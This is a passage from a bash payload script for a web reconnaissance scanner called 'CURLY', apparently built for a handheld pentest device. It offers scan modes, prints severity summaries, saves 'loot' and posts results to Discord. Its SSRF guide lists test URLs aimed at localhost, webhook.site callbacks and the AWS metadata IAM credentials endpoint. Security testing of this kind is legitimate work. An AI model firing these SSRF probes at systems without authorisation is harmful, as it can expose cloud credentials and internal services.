        log_result "[*] No cloud metadata exposure detected"
    else
        # Add verification guide if findings were detected
        log_result ""
        log_result "━━━ HOW TO VERIFY SSRF ━━━"
        log_result "For findings marked [?], manually test SSRF vulnerabilities:"
        log_result ""
        log_result "Test with Burp Collaborator or webhook.site:"
        log_result "  1. Get a unique URL from webhook.site or Burp Collaborator"
        log_result "  2. Test: ${TARGET_URL}?url=http://YOUR-UNIQUE-URL.webhook.site"
        log_result "  3. Check if the server made a request to your URL"
        log_result ""
        log_result "Test internal network access:"
        log_result "  ${TARGET_URL}?url=http://127.0.0.1:80"
        log_result "  ${TARGET_URL}?url=http://localhost/admin"
        log_result "  ${TARGET_URL}?url=http://169.254.169.254/latest/meta-data/"
        log_result ""
        log_result "Test for AWS metadata (if on AWS):"
        log_result "  ${TARGET_URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        log_result "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        log_result ""
    fi

    log_result "NOTE: [!!!] = High confidence | [?] = Requires manual verification | [*] = Likely false positive"
    log_result ""
}

# Show severity summary
show_severity_summary() {
    local total=$((CRITICAL_FINDINGS + HIGH_FINDINGS + MEDIUM_FINDINGS + LOW_FINDINGS))

    # Format elapsed time
    local time_display=""
    if [ $ELAPSED_MINUTES -gt 0 ]; then
        time_display="${ELAPSED_MINUTES}m ${ELAPSED_SECS}s"
    else
        time_display="${ELAPSED_SECS}s"
    fi

    log_result ""
    log_result "╔════════════════════════════════════╗"
    log_result "║    SEVERITY SUMMARY               ║"
    log_result "╠════════════════════════════════════╣"
    log_result "║  🔴 CRITICAL: $CRITICAL_FINDINGS"
    log_result "║  🟠 HIGH:     $HIGH_FINDINGS"
    log_result "║  🟡 MEDIUM:   $MEDIUM_FINDINGS"
    log_result "║  🟢 LOW:      $LOW_FINDINGS"
    log_result "║  ℹ️  INFO:     $INFO_FINDINGS"
    log_result "╠════════════════════════════════════╣"
    log_result "║  TOTAL FINDINGS: $total"
    log_result "║  ⏱️  ELAPSED TIME: $time_display"
    log_result "╚════════════════════════════════════╝"
    log_result ""
}

# === MAIN MENU ===

show_menu() {
    PROMPT "=== CURLY SCANNER ===\n\nSelect scan mode:\n\n1. Quick Scan\n2. Full Scan (All Modules)\n3. API Recon\n4. Security Audit\n5. Tech Fingerprint\n6. Subdomain Enum"
}

# === MAIN ===

LOG "CURLY - Web Recon Scanner"
LOG "by curtthecoder"
LOG ""

# Get target URL from user
LOG "Please enter target URL..."
LOG "(e.g., example.com)"
TARGET_URL=$(TEXT_PICKER "Enter target URL" "example.com")

# Check if user cancelled or rejected
case $? in
    $DUCKYSCRIPT_CANCELLED)
        LOG "User cancelled"
        exit 1
        ;;
    $DUCKYSCRIPT_REJECTED)
        LOG "Dialog rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "An error occurred"
        exit 1
        ;;
esac

if [ -z "$TARGET_URL" ]; then
    LOG "No target provided!"
    exit 1
fi

# Ensure URL has protocol
if ! echo "$TARGET_URL" | grep -qE '^https?://'; then
    TARGET_URL="https://$TARGET_URL"
fi

parse_url "$TARGET_URL"
TARGET_URL="${TARGET_PROTO}://${TARGET_HOST}"

# Follow any redirects to get final destination (e.g., example.com -> www.example.com)
follow_redirects

init_loot

LOG ""
LOG "Target: $TARGET_URL"
LOG ""

# Menu selection
show_menu
SCAN_MODE=$(NUMBER_PICKER "Select scan mode" "1")

# Check if user cancelled
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Operation cancelled"
        exit 1
        ;;
esac

LOG ""

# Display estimated time for selected scan mode
case $SCAN_MODE in
    1) LOG "Starting Quick Scan (estimated: ~30-45 seconds)..." ;;
    2) LOG "Starting Full Scan (estimated: ~2-25 minutes)..." ;;
    3) LOG "Starting API Recon (estimated: ~45-60 seconds)..." ;;
    4) LOG "Starting Security Audit (estimated: ~90-120 seconds)..." ;;
    5) LOG "Starting Tech Fingerprint (estimated: ~20-30 seconds)..." ;;
    6) LOG "Starting Subdomain Enumeration (estimated: ~30-45 seconds)..." ;;
esac

# Capture start time
SCAN_START_TIME=$(date +%s)
play_scan

case $SCAN_MODE in
    1)  # Quick Scan
        scan_ip_geolocation
        scan_ssl_tls
        scan_waf
        scan_tech
        scan_info
        scan_endpoints
        scan_html_source
        ;;
    2)  # Full Scan (All Modules)
        scan_ip_geolocation
        scan_ssl_tls
        scan_waf
        scan_tech
        scan_subdomains
        scan_info
        scan_html_source
        scan_endpoints
        scan_backups
        scan_parameters
        scan_methods
        scan_headers
        scan_cookies
        scan_cors
        scan_redirects
        scan_cloud_metadata
        scan_api
        ;;
    3)  # API Recon
        scan_subdomains
        scan_endpoints
        scan_api
        ;;
    4)  # Security Audit
        scan_ip_geolocation
        scan_ssl_tls
        scan_tech
        scan_info
        scan_html_source
        scan_parameters
        scan_methods
        scan_headers
        scan_cookies
        scan_cors
        scan_redirects
        scan_cloud_metadata
        ;;
    5)  # Tech Fingerprint
        scan_ip_geolocation
        scan_ssl_tls
        scan_waf
        scan_tech
        scan_info
        ;;
    6)  # Subdomain Enumeration
        scan_subdomains
        ;;
    *)
        LOG "Invalid scan mode!"
        exit 1
        ;;
esac

# Calculate elapsed time
SCAN_END_TIME=$(date +%s)
ELAPSED_SECONDS=$((SCAN_END_TIME - SCAN_START_TIME))
ELAPSED_MINUTES=$((ELAPSED_SECONDS / 60))
ELAPSED_SECS=$((ELAPSED_SECONDS % 60))

# Show severity summary
show_severity_summary

led_success
play_complete
VIBRATE 50

LOG ""
LOG "Scan complete!"
LOG "Results: $LOOTFILE"
LOG ""

# Send results to Discord if webhook is configured
send_to_discord

LOG "Check loot dir for details"
